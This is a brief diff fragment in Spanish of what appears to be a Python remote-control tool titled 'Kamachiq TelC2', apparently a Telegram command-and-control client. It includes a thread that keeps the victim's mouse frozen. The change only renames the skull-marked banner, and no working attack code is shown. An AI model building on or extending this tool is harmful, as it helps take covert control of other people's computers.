@@ -81,7 +81,7 @@ threading.Thread(target=keep_mouse_frozen, daemon=True).start()
 
 # Lista de comandos disponibles
 COMANDOS = """
-☠️HKN - Kamachiq☠️
+☠️HKN - hadpcontro☠️
 
 Comandos disponibles Kamachiq TelC2:
 "hola": ¡Hola! ¿Cómo puedo ayudarte? 👋
